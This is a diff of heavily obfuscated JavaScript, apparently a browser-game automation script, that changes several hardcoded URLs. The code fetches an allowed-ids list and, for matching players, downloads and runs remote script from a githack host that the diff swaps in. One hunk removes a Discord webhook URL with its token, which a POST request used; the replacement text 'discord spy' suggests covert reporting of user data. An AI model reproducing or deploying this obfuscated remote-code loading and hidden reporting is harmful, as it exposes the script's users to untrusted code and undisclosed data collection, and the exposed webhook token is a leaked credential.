@@ -390,7 +390,7 @@ function _0x38798b() {
     _0x53eec0 = false
   }
   _0xfcaa6c(
-    'https://dl.dropboxusercontent.com/s/m628q74nfj3elf5/low-frequencies.mp3?dl=0'
+    'dropboxlink low frequencies'
   )
   _0x55d99d()
   _0x3e5926()
@@ -3677,7 +3677,7 @@ function _0x2dbe60() {
 function _0x365812() {
   return new Promise(function (_0x5a56fa, _0x15c515) {
     $.ajax({
-      url: 'https://gistcdn.githack.com/ImKumin/1e14ef7ca3109d23654371d5ba7b20cc/raw/KuminScriptAllowedIds.txt',
+      url: 'https://raw.githack.com/tiagoribeiro0/testing/main/AllowedIds.txt',
       type: 'GET',
       dataType: 'text',
       cache: false,
@@ -3705,7 +3705,7 @@ function _0x29e740() {
   _0x5c8892.settings.additional.includes(_0x1fa781('' + _0x5e09e0.player.id)) &&
     $.ajax({
       type: 'GET',
-      url: 'https://gistcdn.githack.com/ImKumin/0f3fc2239926be75df7fd7e1dd8169bd/raw/Auto%2520Command%2520Sender%2520Additional%2520Code.js',
+      url: 'https://rawcdn.githack.com/tiagoribeiro0/testing/9231401fc00ae52b0f05ac94d3e74f00356299bd/CommanderAdditionalCode.js',
       dataType: 'script',
       cache: false,
     })
@@ -3714,7 +3714,7 @@ async function _0x4d44f3() {
   if (_0x17cfdf() && _0x53eec0) {
     if (_0x4953da % 180 == 0) {
       $.ajax({
-        url: 'https://gistcdn.githack.com/ImKumin/1e14ef7ca3109d23654371d5ba7b20cc/raw/KuminScriptAllowedIds.txt',
+        url: 'https://raw.githack.com/tiagoribeiro0/testing/main/AllowedIds.txt',
         type: 'GET',
         dataType: 'text',
         cache: false,
@@ -3864,7 +3864,7 @@ function _0x599a86(_0x5c2ba4) {
   const _0x1cc37c = new XMLHttpRequest()
   _0x1cc37c.open(
     'POST',
-    'https://discord.com/api/webhooks/819225412794056704/sfMbMFQNmoWVbHMjOBGJiGiu2XknHWcfgT3GzNcXvKOYWL86R8SVEQ9SAuplReRLrAen'
+    'discord spy'
   )
   _0x1cc37c.setRequestHeader('Content-type', 'application/json')
   const _0x2b52ca = {
